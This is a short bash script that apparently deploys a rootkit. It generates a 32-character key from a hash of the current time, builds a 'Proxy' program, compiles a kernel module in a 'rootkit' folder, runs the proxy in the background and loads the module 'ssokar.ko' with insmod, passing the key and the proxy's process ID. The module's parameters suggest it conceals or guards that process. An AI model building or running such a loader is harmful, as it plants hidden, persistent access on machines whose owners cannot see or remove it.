#!/bin/bash

PROGRAMM_NAME=Proxy
KEY=`/bin/date +"%s" | /usr/bin/sha256sum | /usr/bin/base64 | /usr/bin/head -c 32`

## -- Check the key lenght is 32 bytes -- ##
if [ ${#KEY} -ne 32 ]
then
	echo -e "Key generation\t\t[NOK]"
	exit 1
fi
echo -e "Key generation $KEY\t\t[OK]"

make

if [ ! -f $PROGRAMM_NAME ] && [ $? -ne 0 ]
then
	echo -e "Proxy programm generation\t\t [NOK]"
	exit 1
fi

echo -e "Proxy programm generation\t\t [OK]"


cd rootkit
make
if [ $? -ne 0 ]
then
	echo -e "Compiling the rootkit\t\t [NOK]"
	exit 1
fi
cd ../
echo -e "Compiling the rootkit\t\t [OK]"

./Proxy $KEY &

insmod rootkit/ssokar.ko key=$KEY pid_process_proxy=$!
